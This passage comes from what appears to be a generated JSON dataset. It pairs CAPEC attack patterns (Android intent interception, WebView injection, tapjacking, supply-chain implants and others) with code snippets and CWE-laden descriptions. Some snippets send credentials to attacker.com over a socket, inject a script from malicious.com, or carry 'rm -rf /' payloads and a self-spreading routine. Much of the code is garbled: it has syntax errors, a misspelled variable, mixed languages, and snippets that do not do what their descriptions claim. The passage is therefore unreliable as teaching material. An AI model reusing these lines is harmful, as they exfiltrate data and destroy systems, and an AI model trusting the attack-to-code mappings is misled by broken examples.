        "description": "This Python code snippet demonstrates a vulnerable implementation that exposes sensitive information from iOS screenshot images. It lists the temporary screenshot files, reads their contents, and encodes them in base64. The encoded data is then exposed through a custom URL scheme, allowing unauthorized actors to access the sensitive information. The code uses a custom URL scheme handler that does not properly restrict access, and it transmits the sensitive data in cleartext, violating multiple security principles."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\n\npublic class MaliciousReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: No verification of intent source\n        String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n        // CWE-927: Implicit intent for sensitive communication\n        Intent newIntent = new Intent(\"com.example.ACTION\");\n        newIntent.putExtra(\"malicious_data\", sensitiveData);\n        context.sendBroadcast(newIntent);\n    }\n}\n\n// CWE-926: Improper export of Android application components\n<receiver android:name=\".MaliciousReceiver\">\n    <intent-filter>\n        <action android:name=\"com.example.ACTION\"/>\n    </intent-filter>\n</receiver>\n\n// CWE-319: Cleartext transmission of sensitive information\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ns.connect((\"example.com\", 8080))\n\ns.sendall(sensitiveData.encode())\n\n// CWE-924: Improper enforcement of message integrity during transmission\nimport hashlib\n\nreceived_data = s.recv(1024)\n\n# No integrity check or verification of received data\nprint(received_data.decode())",
        "description": "This code snippet demonstrates a malicious Android application that intercepts sensitive data from a trusted application using an implicit intent. The malicious application does not verify the source of the intent, and it transmits the sensitive data in cleartext over an insecure communication channel. The code also lacks proper export restrictions and message integrity checks, making it vulnerable to various attacks."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import webview\n\n# CWE-749: Exposed Dangerous Method or Function\n# CWE-940: Improper Verification of Source of a Communication Channel\n\nclass MaliciousWebView(webview.WebView):\n    def __init__(self):\n        super().__init__()\n        self.load_url('http://example.com')\n        self.execute_js('document.cookie = \"malicious_cookie=1\"')\n\n    def on_loaded(self):\n        # CWE-506: Embedded Malicious Code\n        self.execute_js('var malicious_script = document.createElement(\"script\");\n                         malicious_script.src = \"http://malicious.com/malicious.js\";\n                         document.body.appendChild(malicious_script);')\n\n    def on_page_finished(self):\n        # CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n        cookies = self.get_cookies()\n        if 'malicious_cookie' in cookies:\n            # CWE-602: Client-Side Enforcement of Server-Side Security\n            self.execute_js('document.body.innerHTML = \"<h1>Malicious Content</h1>\"')\n\nif __name__ == '__main__':\n    malicious_webview = MaliciousWebView()\n    malicious_webview.run()",
        "description": "This Python code snippet demonstrates a vulnerable WebView component that allows an adversary to inject malicious code, manipulate the DOM tree and cookies, and expose sensitive information. The code uses a custom WebView class that loads a web page and injects malicious JavaScript code, which can be used to launch attacks against the web application."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\n\npublic class MaliciousReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        // No verification of the intent's source\n        String action = intent.getAction();\n        if (action.equals(\"com.trusted.activity.ACTION\") {\n            // CWE-927: Use of Implicit Intent for Sensitive Communication\n            // Using an implicit intent to launch a counterfeit activity\n            Intent maliciousIntent = new Intent(action);\n            maliciousIntent.setComponent(new ComponentName(\"com.malicious.activity\", \"com.malicious.activity.CounterfeitActivity\"));\n            context.startActivity(maliciousIntent);\n        }\n    }\n}\n\n// CWE-926: Improper Export of Android Application Components\n// Exporting the malicious activity without proper restrictions\n<receiver android:name=\".MaliciousReceiver\">\n    <intent-filter>\n        <action android:name=\"com.trusted.activity.ACTION\"/>\n    </intent-filter>\n</receiver>\n\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n// CWE-940: Improper Verification of Source of a Communication Channel\n// No verification of the communication channel or source of the intent",
        "description": "This code snippet demonstrates a malicious Android application that intercepts an implicit intent sent to launch a trusted activity and instead launches a counterfeit activity. The malicious activity mimics the trusted activity's user interface, prompting the target to enter sensitive data. The code embodies CWE-923, CWE-925, CWE-926, CWE-927, and CWE-940."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String action = intent.getAction();\n        if (action.equals(\"com.example.ACTION\") {\n            // Perform sensitive operation without verifying the intent's source\n            performSensitiveOperation();\n        }\n    }\n\n    private void performSensitiveOperation() {\n        // Sensitive data injection or modification\n        // No access control or verification of intent's source\n        // Implicit intent for sensitive communication\n    }\n}\n",
        "description": "This code snippet demonstrates a vulnerable Android BroadcastReceiver that receives an intent without properly verifying its source, allowing an adversary to inject sensitive data or modify data without authorization. The receiver exports a component for use by other applications without restricting access, making it susceptible to improper access control and sensitive communication."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.os.Bundle\nimport android.webkit.JavascriptInterface\nimport android.webkit.WebView\nimport android.app.Activity\n\nclass JavascriptInterfaceExample {\n    @JavascriptInterface\n    public void performSensitiveOperation() {\n        // This method is accessible from JavaScript and performs a sensitive operation\n        System.out.println(\"Performing sensitive operation...\");\n    }\n}\n\nclass MyActivity extends Activity {\n    private WebView webView;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        webView = (WebView) findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n\n        JavascriptInterfaceExample jsInterface = new JavascriptInterfaceExample();\n        webView.addJavascriptInterface(jsInterface, \"Android\");\n\n        webView.loadUrl(\"http://example.com/malicious_page.html\");\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application that uses WebView's addJavascriptInterface API to register a JavaScript interface. The interface exposes a sensitive method, performSensitiveOperation, which can be accessed by any web page loaded in the WebView, including malicious pages. This allows an adversary to access application-specific functionality through a malicious web page, violating access control and exposing the application to potential attacks."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import os\nimport getpass\nimport tkinter as tk\nfrom tkinter import ttk\n\nclass MaliciousApp:\n    def __init__(self, master):\n        self.master = master\n        self.master.title('Legitimate App')\n        self.frame = ttk.Frame(self.master)\n        self.frame.pack()\n        self.label = ttk.Label(self.frame, text='Enter credentials: ')\n        self.label.pack()\n        self.entry = ttk.Entry(self.frame, show='*')\n        self.entry.pack()\n        self.button = ttk.Button(self.frame, text='Login', command=self.impersonate_user)\n        self.button.pack()\n\n    def impersonate_user(self):\n        username = self.entry.get()\n        password = getpass.getpass('Password: ')\n        # Impersonate user using obtained credentials\n        os.setuid(os.getuid())\n        os.setgid(os.getgid())\n        # Perform malicious actions with impersonated privileges\n        os.system('whoami')\n        os.system('mkdir /tmp/malicious_dir')\n\nroot = tk.Tk()\napp = MaliciousApp(root)\nroot.mainloop()",
        "description": "This Python code snippet demonstrates a malicious application that impersonates a legitimate one, stealing sensitive information and leveraging user privileges. It uses tkinter to create a GUI that mimics a login interface, then uses the obtained credentials to impersonate the user and perform malicious actions with elevated privileges, illustrating CWEs 1021, 556, 520, 506, and 285."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import urllib.parse\n\nmalicious_app_url_scheme = 'malicious_app'\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'alert(\"You have been phished!\");'\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\ndef handle_malicious_request(query_string):\n    # Extract sensitive information from query string\n    sensitive_info = urllib.parse.parse_qs(query_string)['sensitive_info'][0]\n    # CWE-209: Generation of Error Message Containing Sensitive Information\n    error_message = f'Error: {sensitive_info} is invalid'\n    return error_message\n\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\ndef handle_custom_url_scheme(url):\n    if url.scheme == malicious_app_url_scheme:\n        # CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n        redirect_url = 'http://untrusted-site.com/phishing_page'\n        return redirect_url\n    else:\n        return 'Error: Invalid URL scheme'\n\n# Register malicious app for custom URL scheme\nregister_url_scheme_handler(malicious_app_url_scheme, handle_custom_url_scheme)\n",
        "description": "This Python code snippet demonstrates a malicious application that registers for a custom URL scheme, mimicking a target application. When a user interacts with the malicious app, it extracts sensitive information from the query string and displays an error message containing that information. The code also includes an open redirect vulnerability, redirecting the user to an untrusted site."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import tkinter as tk\nfrom tkinter import messagebox\n\n# CWE-1021: Improper Restriction of Rendered UI Layers or Frames\nroot = tk.Tk()\nroot.overrideredirect(True)  # Create a window without a title bar\nroot.geometry(\"+250+250\")  # Position the window\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\nfake_button = tk.Button(root, text=\"Click here to win a prize!\", command=lambda: messagebox.showinfo(\"Congratulations\", \"You won!\"))\nfake_button.pack()\n\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\nimport webbrowser\nwebbrowser.register_handler('schemehandler', lambda url: webbrowser.open_new_tab('https://attacker.com'))\n\n# CWE-222: Truncation of Security-relevant Information\ndef truncate_info(info):\n    return info[:10] + \"...\"\n\n# CWE-319: Cleartext Transmission of Sensitive Information\nimport socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('attacker.com', 8080))\nsock.sendall(b'username=password')\n\nroot.mainloop()",
        "description": "This Python code snippet demonstrates a malicious application that overlays a fake interface on top of another, convincing the user to interact with the attacker's application instead of the intended one. It uses tkinter to create a window without a title bar, misrepresenting critical information to the user. The code also registers a custom URL scheme handler, allowing the attacker to invoke the handler without proper authorization. Additionally, it truncates security-relevant information and transmits sensitive data in cleartext."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import os\nimport getpass\n\n# CWE-922: Insecure Storage of Sensitive Information\npassword_file = '/etc/passwords.txt'\nwith open(password_file, 'r') as f:\n    passwords = f.read().splitlines()\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsystem_info = os.uname()\nprint('System Information:', system_info)\n\n# CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\nsensitive_data = 'Top Secret Information'\nwith open('/tmp/sensitive_data.txt', 'w') as f:\n    f.write(sensitive_data)\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# Simulating a physical side channel (e.g., power consumption pattern)\nimport time\nwhile True:\n    # Perform some CPU-intensive task\n    result = [i**2 for i in range(1000000)]\n    time.sleep(1)\n\n# CWE-1263: Improper Physical Access Control\n# Assuming the script is running on a device with physical access\n# An adversary with physical access can easily access the device and steal sensitive information",
        "description": "This Python code snippet demonstrates a scenario where an adversary gains physical access to a system or device, allowing them to exploit various vulnerabilities. The code stores sensitive information in an insecure manner, exposes system-level information, and stores sensitive data without access control. Additionally, it simulates a physical side channel and lacks proper physical access control, making it vulnerable to attacks."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import getpass\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\npersonal_info = {'name': 'John Doe', 'address': '123 Main St', 'phone_number': '123-456-7890'}\nprint('Personal Information:', personal_info)\n\n# CWE-222: Truncation of Security-relevant Information\nsecurity_log = '2022-01-01 12:00:00 - User logged in successfully'\nprint('Security Log:', security_log[:20])\n\n# CWE-319: Cleartext Transmission of Sensitive Information\nimport socket\n\n# Create a socket object\nsock = socket.socket()\n\n# Connect to the server\nserver_address = ('localhost', 8080)\nsock.connect(server_address)\n\n# Send sensitive information in cleartext\nsensitive_data = 'username=' + username + '&password=' + password\nsock.send(sensitive_data.encode())\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport os\n\n# Get the current working directory\ncwd = os.getcwd()\nprint('Current Working Directory:', cwd)\n",
        "description": "This Python code snippet demonstrates a shoulder surfing attack, where an adversary observes an unaware individual's keystrokes, screen content, or conversations to obtain sensitive information. The code exposes sensitive information, such as usernames, passwords, and personal information, and transmits it in cleartext over a network connection. It also truncates security-relevant information and exposes sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import hashlib\nimport base64\nimport os\nimport getpass\nimport kerberos\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n\n# Get user credentials\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n\n# Store credentials in plaintext\nwith open('credentials.txt', 'w') as f:\n    f.write(f'Username: {username}\\nPassword: {password}\\n')\n\n# Use weak password hashing\nhashed_password = hashlib.md5(password.encode()).hexdigest()\n\n# Use Kerberos authentication with RC4 encryption\nkrb_ctx = kerberos.authGSSClientInit('service_name@REALM.COM')\nkrb_ctx.encrypted_ticket = base64.b64encode(os.urandom(16))\n\n# Save the local ticket to disk\nwith open('ticket.ccache', 'wb') as f:\n    f.write(krb_ctx.encrypted_ticket)\n",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting Kerberos authentication with Service Principal Names (SPNs) to obtain and crack hashed credentials of a service account target. The code uses weak password requirements, stores credentials in plaintext, and employs single-factor authentication, making it vulnerable to various attacks."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import requests\n\n# CWE-346: Origin Validation Error\n\n# Malicious application piggy-backing on trusted user's session\nmalicious_app_session = requests.Session()\nmalicious_app_session.headers.update({'Authorization': 'Bearer ' + trusted_user_token})\n\n# CWE-863: Incorrect Authorization\n\n# SaaS application does not correctly perform authorization check\nsaas_app_url = 'https://saas-app.com/api/protected-resource'\nmalicious_app_response = malicious_app_session.get(saos_app_url)\n\nif malicious_app_response.status_code == 200:\n    # CWE-285: Improper Authorization\n    # SaaS application does not perform authorization check\n    print('Malicious application successfully accessed protected resource')\n\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n\n# SaaS application provides an inconsistent view of the underlying OS\nsaas_app_admin_tool_url = 'https://saas-app.com/admin-tool'\nmalicious_app_admin_tool_response = malicious_app_session.get(saos_app_admin_tool_url)\n\nif malicious_app_admin_tool_response.status_code == 200:\n    print('Malicious application successfully accessed admin tool')\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\n# SaaS application relies on client to implement security mechanism\nsaas_app_security_mechanism_url = 'https://saas-app.com/security-mechanism'\nmalicious_app_security_mechanism_response = malicious_app_session.get(saos_app_security_mechanism_url)\n\nif malicious_app_security_mechanism_response.status_code == 200:\n    print('Malicious application successfully bypassed security mechanism')",
        "description": "Python code snippet demonstrating the CAPEC attack, where a malicious application piggy-backs on a trusted user's session to perform malicious actions against a SaaS application. The code leverages CWE-346, CWE-863, CWE-285, CWE-1249, and CWE-602 to illustrate the vulnerabilities."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import os\nimport socket\nimport json\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsystem_info = {'os': os.name, 'username': os.getlogin(), 'cwd': os.getcwd()}\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import subprocess; subprocess.run([\"rm\", \"-rf\", \"/\"])\n'\nwith open('malicious_file.py', 'w') as f:\n    f.write(malicious_code)\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\ndef upload_file(file):\n    with open(file, 'wb') as f:\n        f.write(b'\\x90' * 1024)  # upload a malicious executable file\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\ndebug_info = {'api_key': 'my_secret_api_key', 'database_credentials': 'my_secret_db_credentials'}\nprint(debug_info)\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsensitive_info = {'credit_card_number': '1234-5678-9012-3456', 'password': 'my_secret_password'}\nsocket.send(json.dumps(sensitive_info).encode())",
        "description": "This Python code snippet demonstrates the CAPEC attack by embedding malicious code, exposing sensitive system information, unrestrictedly uploading files with dangerous types, inserting sensitive information into debugging code, and exposing sensitive information to unauthorized actors. The code creates a malicious file, uploads a dangerous executable file, prints sensitive debugging information, and sends sensitive credit card and password information over a socket."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import hashlib\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nvulnerable_component = 'malicious_firmware'\n\n# CWE-1329: Reliance on Component That is Not Updateable\nnon_updateable_component = 'unpatchable_driver'\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nuntrusted_component = 'unverified_sensor'\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\nvoltage_glitch_prone_device = 'unprotected_circuit'\n\n# CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State\n predictor_state_vulnerable_device = 'shared_microarchitectural_predictor'\n\n# Maliciously altered hardware component substitution\nmalicious_component = 'backdoored_fpga'\n\n# Baseline component\nbaseline_component = 'original_fpga'\n\n# Substitution during product development and research phases\nif development_phase:\n    component_to_use = malicious_component\nelse:\n    component_to_use = baseline_component\n\n# Use the substituted component\nresult = hashlib.sha256(component_to_use.encode()).hexdigest()\nprint(result)\n",
        "description": "This code snippet demonstrates the CAPEC, where an adversary substitutes a maliciously altered hardware component during the product development and research phases. The malicious component is used in place of the original baseline component, potentially leading to adjustments and calibrations that compromise the final product's performance and security. The code incorporates CWEs 1395, 1329, 1357, 1247, and 1423, highlighting the risks associated with vulnerable third-party components, non-updateable components, insufficiently trustworthy components, voltage and clock glitches, and shared microarchitectural predictor state."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import os\n\ndef alter_documentation(doc_path, restricted_countries):\n    with open(doc_path, 'r') as file:\n        doc_content = file.read()\n    # CWE-1059: Insufficient Technical Documentation\n    # Assuming the documentation contains a list of restricted countries\n    restricted_countries_str = ', '.join(restricted_countries)\n    doc_content = doc_content.replace('Restricted to: ' + restricted_countries_str, 'Available to all countries')\n    # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    # Exposing sensitive information about the advanced technology\n    doc_content += '\\nAdvanced technology details: \\n' + get_advanced_tech_details()\n    # CWE-695: Use of Low-Level Functionality\n    # Using low-level file I/O operations\n    with open(doc_path, 'w') as file:\n        file.write(doc_content)\n    # CWE-222: Truncation of Security-relevant Information\n    # Truncating the log entry to hide the alteration\n    log_entry = 'Documentation updated successfully'\n    log_file = 'documentation_log.txt'\n    with open(log_file, 'a') as file:\n        file.write(log_entry[:50] + '\\n')\n    # CWE-1263: Improper Physical Access Control\n    # Granting access to the altered documentation\n    os.chmod(doc_path, 0o666)\n",
        "description": "This code snippet demonstrates the CAPEC by altering a manufacturer's documentation to circumvent dial-down functionality requirements. It replaces the list of restricted countries with 'Available to all countries', exposes sensitive information about the advanced technology, and truncates the log entry to hide the alteration. The code uses low-level file I/O operations and grants access to the altered documentation, violating physical access control."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "import os\n\ndef get_system_capabilities(doc_path):\n    if not os.access(doc_path, os.R_OK):\n        raise Exception('Insufficient permissions to access documentation')\n    doc = open(doc_path, 'r')\n    capabilities = {}\n    for line in doc:\n        if 'capability' in line:\n            capability, description = line.strip().split(':')\n            capabilities[capability] = description\n    return capabilities\n\ndef deploy_system(capabilities):\n    if 'sensitive_info' in capabilities:\n        print('Exposing sensitive system information: ', capabilities['sensitive_info'])\n    if 'low_level_functionality' in capabilities:\n        print('Using low-level functionality: ', capabilities['low_level_functionality'])\n    # Missing documentation for design, assuming default implementation\n    if 'implementation' not in capabilities:\n        capabilities['implementation'] = 'default'\n    # Improper following of specification by caller, assuming default spec\n    if 'specification' not in capabilities:\n        capabilities['specification'] = 'default'\n    return capabilities\n\ndoc_path = 'system_documentation.txt'\ntry:\n    capabilities = get_system_capabilities(doc_path)\n    deploy_system(capabilities)\nexcept Exception as e:\n    print('Error: ', str(e))",
        "description": "This code snippet demonstrates the CAPEC by altering system capabilities through modified documentation, leading to errors in derived system requirements. The related CWEs are embodied as follows: CWE-1059 (Insufficient Technical Documentation) is shown through the lack of proper documentation checks, CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is demonstrated by exposing sensitive information, CWE-573 (Improper Following of Specification by Caller) is shown through the assumption of default specifications, CWE-695 (Use of Low-Level Functionality) is demonstrated by using low-level functionality, and CWE-1053 (Missing Documentation for Design) is shown through the assumption of default implementation."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemDesign:\n    def __init__(self, documentation):\n        self.documentation = documentation\n\n    def allocate_requirements(self):\n        # Missing documentation for design (CWE-1053)\n        if 'design_specifications' not in self.documentation:\n            return {}\n\n        design_specifications = self.documentation['design_specifications']\n        # Insufficient technical documentation (CWE-1059)\n        if 'software_elements' not in design_specifications:\n            return {}\n\n        software_elements = design_specifications['software_elements']\n        # Improper following of specification by caller (CWE-573)\n        if 'implementation_language' not in software_elements:\n            return {}\n\n        implementation_language = software_elements['implementation_language']\n        # Incorrect provision of specified functionality (CWE-684)\n        if implementation_language == 'Python' and 'incorrect_functionality' in software_elements:\n            return software_elements['incorrect_functionality']\n\n        # Improper control of dynamically-managed code resources (CWE-913)\n        dynamic_resources = software_elements.get('dynamic_resources', [])\n        for resource in dynamic_resources:\n            if 'unrestricted_access' in resource:\n                return resource['unrestricted_access']\n\n        return {}\n\n# Example usage:\ndocumentation = {\n    'design_specifications': {\n        'software_elements': {\n            'implementation_language': 'Python',\n            'incorrect_functionality': 'malicious_code',\n            'dynamic_resources': [{\n                'unrestricted_access': 'backdoor'\n            }]\n        }\n    }\n}\nsystem_design = SystemDesign(documentation)\nresult = system_design.allocate_requirements()\nprint(result)\n",
        "description": "This code snippet demonstrates the CAPEC where an attacker maliciously alters the manufacturer's documentation to cause errors in system design. The code lacks sufficient technical documentation (CWE-1059), has missing documentation for design (CWE-1053), and improperly follows specifications by the caller (CWE-573). It also incorrectly provides specified functionality (CWE-684) and improperly controls dynamically-managed code resources (CWE-913). The altered documentation can lead to the execution of malicious code or unauthorized access to system resources."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "import hashlib\n\ndef malicious_firmware_update(firmware):\n    # CWE-506: Embedded Malicious Code\n    malicious_code = b'\\x90\\x90\\x90\\x90'  # Replace with actual malicious code\n    firmware += malicious_code\n    return firmware\n\ndef main():\n    # CWE-1357: Reliance on Insufficiently Trustworthy Component\n    untrusted_component = 'untrusted_firmware_component.so'\n    firmware = bytearray(open(untrusted_component, 'rb').read())\n    \n    # CWE-1395: Dependency on Vulnerable Third-Party Component\n    vulnerable_component = 'vulnerable_library.so'\n    firmware += bytearray(open(vulnerable_component, 'rb').read())\n    \n    # CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n    firmware_hash = hashlib.sha256(firmware).hexdigest()\n    if firmware_hash != 'expected_hash':\n        print('Firmware has been tampered with!')\n    \n    # CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n    undocumented_feature = b'\\x01\\x02\\x03\\x04'  # Replace with actual undocumented feature\n    firmware += undocumented_feature\n    \n    return firmware\n\nif __name__ == '__main__':\n    malicious_firmware = malicious_firmware_update(main())\n    open('malicious_firmware.bin', 'wb').write(malicious_firmware)",
        "description": "This Python code snippet demonstrates the CAPEC of introducing counterfeit hardware components into a product assembly. It includes CWE-506 by embedding malicious code into the firmware, CWE-1357 by relying on an untrusted component, CWE-1395 by depending on a vulnerable third-party component, CWE-207 by introducing an observable behavioral discrepancy, and CWE-1242 by including an undocumented feature."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "class InsecureHardwareDesign:\r\n    def __init__(self):\r\n        self.register_defaults = {'debug_mode': True, 'access_control': 'low'}\r\n        self.ip_parameters = {'secure_boot': False, 'secure_storage': False}\r\n        self.lock_bits = {'register_access': 0x00, 'address_regions': 0x01}\r\n\r\n    def set_register_defaults(self):\r\n        # CWE-1221: Incorrect Register Defaults or Module Parameters\r\n        self.register_defaults['debug_mode'] = True\r\n\r\n    def set_ip_parameters(self):\r\n        # CWE-1221: Incorrect Register Defaults or Module Parameters\r\n        self.ip_parameters['secure_boot'] = False\r\n\r\n    def set_lock_bits(self):\r\n        # CWE-1231: Improper Prevention of Lock Bit Modification\r\n        self.lock_bits['register_access'] = 0x00\r\n\r\n    def debug_component(self):\r\n        # CWE-1296: Incorrect Chaining or Granularity of Debug Components\r\n        if self.register_defaults['debug_mode']:\r\n            return 'Debug mode enabled'\r\n        else:\r\n            return 'Debug mode disabled'\r\n\r\n# CWE-1059: Insufficient Technical Documentation\r\n# Lack of documentation on hardware design and implementation\r\n\r\n# CWE-657: Violation of Secure Design Principles\r\n# Insecure design principles used in hardware design",
        "description": "This code snippet demonstrates a vulnerable hardware design that embodies the CAPEC description. It includes insecure register defaults, incorrect IP parameters, and improper lock bit modification. The code also lacks sufficient technical documentation and violates secure design principles, making it vulnerable to attacks."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "import hashlib\n\ndef verify_firmware(firmware):\n    # CWE-506: Embedded Malicious Code\n    if b'malicious_code' in firmware:\n        return False\n    return True\n\ndef update_firmware(firmware):\n    # CWE-1329: Reliance on Component That is Not Updateable\n    try:\n        # Attempt to update firmware, but it will fail\n        firmware.update()\n    except NotImplementedError:\n        print('Firmware cannot be updated')\n    return firmware\n\ndef inject_error(redundant_block):\n    # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    redundant_block.inject_error()\n    return redundant_block\n\ndef build_system(component1, component2):\n    # CWE-1357: Reliance on Insufficiently Trustworthy Component\n    if not component1.is_trusted() or not component2.is_trusted():\n        return None\n    return component1 + component2\n\ndef main():\n    firmware = b'firmware_data'\n    if not verify_firmware(firmware):\n        print('Firmware is malicious')\n    else:\n        updated_firmware = update_firmware(firmware)\n        redundant_block = inject_error(updated_firmware)\n        system = build_system(updated_firmware, redundant_block)\n        if system is None:\n            print('System cannot be built with untrusted components')\n        else:\n            print('System built successfully')\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates a vulnerable system that relies on untrusted and outdated components, allowing an adversary to inject malicious code and errors, and ultimately compromise the system."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import os\nimport requests\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"import os; os.system('rm -rf /')\"  # delete all files on the system\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    # replicate the malicious code to other systems\n    for ip in ['192.168.1.1', '192.168.1.2', '192.168.1.3']:\n        requests.post(f'http://{ip}:8080/infect', data={'code': malicious_code})\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\ndef inject_error():\n    # inject errors into a redundant block to deprive the system of redundancy\n    os.system('echo 1 > /proc/sys/kernel/hardware_error')\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nfrom vulnerable_library import vulnerable_function\n\n# CWE-1229: Creation of Emergent Resource\ndef create_emergent_resource():\n    # create a new resource that can be used by attackers\n    os.system('mkdir /tmp/malicious_resource')\n\n# implant the malicious software in the supply chain distribution channel\nreplicate_malicious_code()\ninject_error()\nvulnerable_function()\ncreate_emergent_resource()",
        "description": "This Python code snippet demonstrates the CAPEC of implanting malicious software in the supply chain distribution channel. It includes embedded malicious code (CWE-506), replicating malicious code (CWE-509), unauthorized error injection (CWE-1334), dependency on a vulnerable third-party component (CWE-1395), and creation of an emergent resource (CWE-1229). The code replicates itself to other systems, injects errors into a redundant block, uses a vulnerable library, and creates a new resource that can be exploited by attackers."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import sqlite3\n\ndef inject_malicious_code(component_name, malicious_code):\n    conn = sqlite3.connect('integration_facility.db')\n    c = conn.cursor()\n    c.execute(\"INSERT INTO components (name, code) VALUES (?, ?)\", (component_name, malicious_code))\n    conn.commit()\n    conn.close()\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"import os\\nos.system('rm -rf /')\"  # delete entire file system\ninject_malicious_code('rogue_component', malicious_code)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nfrom untrusted_library import vulnerable_function\nvulnerable_function()\n\n# CWE-89: SQL Injection\ndef get_component(component_name):\n    conn = sqlite3.connect('integration_facility.db')\n    c = conn.cursor()\n    c.execute(\"SELECT code FROM components WHERE name = '\" + component_name + \"'\"\")\n    code = c.fetchone()[0]\n    conn.close()\n    return code\n\n# CWE-707: Improper Neutralization\ndef process_message(message):\n    if 'error' in message:\n        raise Exception('Error injected!')\n    return message\n\n# CWE-1334: Unauthorized Error Injection\ndef inject_error(redundant_block):\n    redundant_block.inject_error()\n",
